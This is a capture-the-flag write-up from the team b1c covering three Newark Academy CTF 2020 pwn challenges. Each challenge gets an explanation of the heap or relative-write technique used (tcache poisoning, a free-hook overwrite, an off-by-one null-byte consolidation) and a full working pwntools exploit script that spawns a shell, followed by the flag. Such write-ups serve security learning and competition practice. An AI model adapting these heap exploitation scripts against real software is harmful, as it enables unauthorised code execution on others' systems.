# Newark Academy CTF 2020 Internal

b1c takes third global and first in highschools (We stole Gabe for one algo challenge *again*).

We also maintained the b1c tradition of dropping from 1st to 3rd due to a single challenge (*ahem* veggie factory 5 *ahem*) :upside_down_face:


## Grade calculator

Coming soon after admins finish verifications :D


## Covid tracker tracker tracker
> Pwn 500, 40 solves
> You've heard of COVID trackers, you might have heard of COVID tracker trackers, but what about COVID tracker tracker trackers? This one is a little rough around the edges, but what could possibly go wrong?
> 
> nc challenges.ctfd.io 30252
> 
> -asphyxia

No PIE, so we can poison tcache and point it to `setvbuf@got` to read a libc pointer. Then, we can poison tcache again to write `system` to `__libc_free_hook`.

We have to do some fiddling with the amount of trackers we create to ensure we can recover from the initial tcache poison. The tcache will look something like `HEAD -> <actual chunks> -> setvbuf@got -> setvbuf@libc -> <bad memory>`. Any further allocations past setvbuf@libc would cause a segfault.

We can fix this by creating an excess of freeable chunks before poisoning, and freeing them to the head of the desired tcache bin after our first poison, creating a sort of "buffer" of newly poisonable chunks.

Then, just tcache poison to overwrite `__libc_free_hook` with `system` and free a chunk with `/bin/sh`.


```python
from pwn import *

e = ELF("./cttt")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = e
context.terminal = ["konsole", "-e"]

p = process([ld.path, e.path], env={"LD_PRELOAD": libc.path})
p = remote("challenges.ctfd.io", 30252)

context.log_level="debug"
gdb.attach(p, """c""")

def add():
    p.sendlineafter(">", "1")


def edit(idx, n):
    p.sendlineafter(">", "2")
    p.sendlineafter("?", str(idx))
    p.sendlineafter("?", n)


def remove(idx):
    p.sendlineafter(">", "3")
    p.sendlineafter("?", str(idx))


def show():
    p.sendlineafter(">", "4")



add()   #1
add()   #2
add()   #3
add()   #4
add()   #5
add()   #6
add()   #7
add()   #8
add()   #9
add()   #10
edit(10, "/bin/sh")



remove(6)
remove(5)
remove(4)
remove(3)
remove(2)
remove(1)


edit(1, p64(e.got["setvbuf"]))



add()   #11
add()   #12

show()

p.recvuntil("12) ")

libc.address = u64(p.recv(6).ljust(8, "\x00")) - 529136


print("libc base", hex(libc.address))


remove(7)

edit(7, p64(libc.sym["__free_hook"]))

add()   #13
add()   #14

edit(14, p64(libc.sym["system"]))

remove(10)



p.interactive()
```

Flag: `nactf{d0nt_us3_4ft3r_fr33_zsouEFF4bfCI5eew}`


## Tale of two
> Pwn 500, 36 solves
> A tale of two functions, two operations, and a flag.
> 
> nc challenges.ctfd.io 30250
> 
> -asphyxia

We get one relative read and one relative write. We can read a libc pointer at offset -4 and we can write a one_gadget to .fini_array at offset -75.

```python
from pwn import *

e = ELF("./tale-of-two")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = e
context.terminal = ["konsole", "-e"]

p = process(e.path)
p = remote("challenges.ctfd.io", 30250)


context.log_level="debug"
gdb.attach(p, """b * main+190
           b * main+233
           c""")


#read

p.sendlineafter("?", "-4")

p.recvline()

libc.address = int(p.recvline().strip(), 16) - 507584

print("libc base", hex(libc.address))




#write a one gadget to .fini_array, which is at offset -600/8 == -75

og = libc.address + 0x4f322

print("one gadget", hex(og))

p.sendlineafter("?", "-75")

p.sendlineafter("?", str(og))


p.interactive()
```

Flag: `nactf{a_l0n3ly_dt0r_4nd_a_sh3ll_tUIlF0jxW5aMXoGo}`

## gcalc
> Pwn 700, 23 solves
> Weighted averaging is too hard, so I made a program to do it for you!
> 
> nc challenges.ctfd.io 30253
> 
> -asphyxia

This solution takes approx. 2 minutes and 30 seconds to run on remote lol.


We are given three important functions:
1) Add a category
2) Set grades in a category
3) Print report


Each grade category is implemented as a struct.
There is a global array of category entry structs, which is below:

![](https://i.imgur.com/J63ieL9.png)


There is enough space in the global category array for 16 structs.


#### Add category

![](https://i.imgur.com/zPZ0yFS.png)

We can see that we can malloc as large a chunk for grades as we want, provided that the size is nonzero. The decompilation spasm at the end is useless, and we can ignore that.

The chunk that we allocate will be set as the chunk_ptr of the next available category struct within the category array.


#### Set grades

![](https://i.imgur.com/bRhUMHQ.png)


Here, we can set grades in each category. Each byte in a category's chunk_ptr chunk is a "grade".

We are given the choice to resize a chunk before adding grades. Note that if read_int() returns a 0, then nothing happens. However, any other number will trigger a call to free the current chunk referenced by the selected category. Then, a new call to malloc is made with the requsted size.

Finally, note line 35, which contains an off by one error. In select cases, we can write into the lowest byte of the size of the next chunk. More on this later.


#### Print report

This function calculates your final percent grade.

I'm not going to show the decomp for this one because it hurts my head to look at it, and is essentially useless.

The only important function it serves is that it allows us to view each byte of each chunk as a signed integer (a "grade") as part of its functionality.


#### Libc Leak

We can leak libc fairly trivially. We can:
1. Create a 0x420 sized chunk to go into the unsorted bin
2. Create a 0x10 sized chunk to prevent top consolidation
3. Set the grade to something different to cause a free() on the unsorted bin chunk
4. Create a chunk
5. Print report

This creates a chunk to go into the unsorted bin, frees it, allocates from it, and then directly reads it. 

Because of how the unsorted bin works, libc pointers are written to the first few bytes of chunks (the `fwd` and `bk` fields) in the unsorted bin, and aren't zeroed when allocated. We can abuse this to leak libc on the uninitialized chunk that we allocate.


#### Arbitrary Write

Recall the off by one in the set grades function. Can we abuse this? Yes!

If we allocate an n sized chunk, we can write n+1 bytes. However, this usually wouldn't be helpful since the next chunk is further from the end of our write, right? Nooooo.

If we create a chunk size divisible by 8 but not 10, such as 0xf8, we can write into the lowest byte of the next chunk.

Using this, you'd think that I would go and change the size of the next chunk to be very large and do stuff from there. Instead, I'm lazy and just decided to use a null byte like in picoCTF 2019's Ghost Diary.

We:
- Allocate 7 0xf0 chunks (these will be used to fill tcache later so we can get an unsorted chunk later)
- Allocate a 0xf0 chunk (Call this chunk A)
- Allocate a 0x18 chunk (Call this chunk B)
- Allocate a 0xf0 chunk (Call this chunk C)
- Free all 7 of our first 7 0xf0 chunks using the set_grades function to fill the 0x100 tcache

The last step will put 7 chunks into the 0x100 tcache (0xf0 + 0x10 bytes metadata).

Because of the malloc at the end of the set_grades function, we don't need to malloc a little chunk after chunk C to prevent top conslidation.

Then, we do the following corruption:
- Free chunk A
- Write to chunk B, forge a chunk, and overflow into chunk C's `size` parameter with a null byte
- Free chunk C
- Free chunk B

Chunk A gets added to the unsorted bin list because the 0x100 tcache is already filled.

Chunk B needs a certain 0x120 size written to the `prev_size` field of chunk C (Chunk A's 0x100 + Chunk B's 0x20)

Chunk C is freed, causing backwards consolidation with what malloc thinks is just chunk A, but is really chunk A + B.

Finally, chunk B is freed, putting it onto the tcache and setting us up for tcache poisoning.

After that, all we have to do is allocate a chunk from chunk A + B to overwrite the `fwd` pointer of the free B chunk.

We can overwrite `fwd` with `__libc_free_hook`, write `system` to it, and free a chunk that has `/bin/sh` written to it.


```python
from pwn import *

e = ELF("./gcalc")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = e
context.terminal = ["konsole", "-e"]

p = process([e.path])
p = remote("challenges.ctfd.io", 30253)


context.log_level="debug"
gdb.attach(p, """c""")


def add_cat(weight, amt):
    p.sendlineafter(">", "1")
    p.sendlineafter(")", str(weight))
    p.sendlineafter("?", str(amt))


def set_grades(cat, sz, grades):
    p.sendlineafter(">", "2")
    p.sendlineafter(")", str(cat))
    p.sendlineafter("):", str(sz))
    
    for i in grades:
        p.sendlineafter(":", str(i))


def generate():
    p.sendlineafter(">", "3")



add_cat(100, 1056)      #1
add_cat(100, 20)        #2

set_grades(1, 1, [1, 1])


add_cat(100, 6)          #3

generate()


p.recvuntil("#3:")

p.recvuntil("Grades: ")


# truly get into the Python spirit
libc.address = u64(''.join(map(lambda x: chr(int(x)) if int(x) >= 0 else chr(int(x)+256), p.recvline().strip().split(", "))).ljust(8, "\x00")) - 4111520       # make sure to calculate two's complement if negative


print("libc address", hex(libc.address))

add_cat(100, 0x3d0)     #4


for i in range(7):
    add_cat(100, 0xf0)      #5, 6, 7, 8, 9, 10, 11
    
    

add_cat(100, 0xf0)      #12

add_cat(100, 0x18)      #13

add_cat(100, 0xf0)      #14



for i in range(7):
    set_grades(i+5, 0x80, [1 for i in range(0x81)])



set_grades(12, 0x500, [1 for i in range(0x501)])


set_grades(13, 'n', [0x41 for i in range(0x10)] + [0x20, 0x1] + [0x0 for i in range(6)] + [0])


set_grades(14, 0x500, [1 for i in range(0x501)])


#set_grades(13, 'n', [0x1 for i in range(0x19)])


set_grades(13, 0x30, [0x1 for i in range(0x31)])


forge = ""
forge += '\x00'*0xb0
forge += p64(0) + p64(0x69)

forge += p64(libc.sym["__free_hook"])



set_grades(1, 0x170, [ord(i) for i in forge] + [0 for i in range(0x171 - len(forge))])



set_grades(5, 0x10, [1 for i in range(0x11)])
set_grades(6, 0x10, [1 for i in range(0x11)])
set_grades(7, 0x10, [ord(i) for i in p64(libc.sym["system"])] + [0 for i in range(9)])


set_grades(8, 0x10, [ord(i) for i in p64(0x68732f6e69622f)] + [0 for i in range(9)])


p.sendlineafter(">", "2")
p.sendlineafter(")", "8")
p.sendlineafter("):", "32")

p.interactive()
```

Flag: `nactf{0n3_byt3_ch40s_l34d5_t0_h34p_c3rn4g3_PP0SvwNV44uwRSbm}`
